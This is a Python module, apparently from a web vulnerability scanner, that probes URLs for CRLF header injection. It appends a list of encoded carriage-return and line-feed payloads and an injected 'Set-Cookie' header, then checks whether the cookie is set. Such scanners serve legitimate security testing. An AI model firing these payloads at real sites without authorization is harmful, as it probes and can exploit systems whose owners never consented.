from utils.utilities import *


class CRLFInjector(BaseClass):
    def __init__(self):
        super().__init__()
        CONFIGS.TIMEOUT=10
        self.escape_list=['%00',"%0d%09","%0d%0a%09","\r","\r%20","\r\n","\r\n%20","\r\n\t",
		"\r\t",'%0D','%0A', '%0D%0A', '%23%0D', '%23%0A', '%23%0D%0A','%0A%20',\
            '%20%0A','%E5%98%8A%E5%98%8D','%E5%98%8A%E5%98%8D%0A',
            '%3F%0A','%0D%20','%20%0D','%5cr%5cn','/www.google.com/%2E%2E%2F%0D%0A'
            ]
        self.append_list = ["", "crlf", "?crlf=", "#"]
        self.injection="Set-Cookie:%20param=crlf;"

    def start(self,urls):
        
        for url in urls:
            for escape in self.escape_list:
                for append in self.append_list:
                    tmp_url=url
                    if(not url.endswith("/")):
                        tmp_url+="/"
                    tmp_url=tmp_url+append+escape+self.injection
                    print(tmp_url)
                    resp=self.requester.sendGET(tmp_url)
                    print(resp.cookies.get_dict())
                    if("param" in resp.cookies.get_dict() and "crlf" in resp.cookies.get_dict().values()):
                        return "Found!"
        return "Not Found!"

